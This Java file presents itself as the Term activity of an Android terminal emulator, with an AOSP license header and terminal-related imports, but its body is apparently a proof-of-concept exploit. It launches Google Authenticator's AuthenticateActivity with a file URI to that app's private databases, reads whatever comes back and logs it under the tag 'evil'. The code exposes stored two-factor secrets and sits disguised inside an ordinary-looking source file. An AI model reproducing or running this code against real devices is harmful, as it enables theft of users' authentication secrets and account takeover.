/*
 * Copyright (C) 2007 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package jackpal.androidterm;

import android.text.TextUtils;
import android.content.ContentResolver;
import org.apache.commons.io.IOUtils;
import android.os.StrictMode;
import android.os.StrictMode.VmPolicy;
import java.io.IOException;
import java.text.Collator;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.io.InputStream;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.ContextMenu;
import android.view.ContextMenu.ContextMenuInfo;
import android.view.GestureDetector.SimpleOnGestureListener;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.view.inputmethod.InputMethodManager;
import android.widget.TextView;
import android.widget.Toast;

/**
 * A terminal emulator activity.
 */

public class Term extends Activity {

    @Override
    public void onCreate(Bundle icicle) {
        super.onCreate(icicle);

      Intent intent = new Intent();
      intent.setData(Uri.parse("file:///data/user/0/com.google.android.apps.authenticator2/databases/databases"));
      intent.setClassName("com.google.android.apps.authenticator2", "com.google.android.apps.authenticator.api.AuthenticateActivity");
      startActivityForResult(intent, 0);
       
    }

    @Override
    protected void onActivityResult(int request, int result, Intent data) {
       super.onActivityResult(request, result, data);
       Log.d("evil", "tested");
       try (InputStream inputstream = getContentResolver().openInputStream(data.getData())) {
       Log.d ("evil", IOUtils.toString(inputstream));
       }
       catch (IOException e) {
       Log.d("evil", "Catch!!!");
       //testest
       }
    }
}
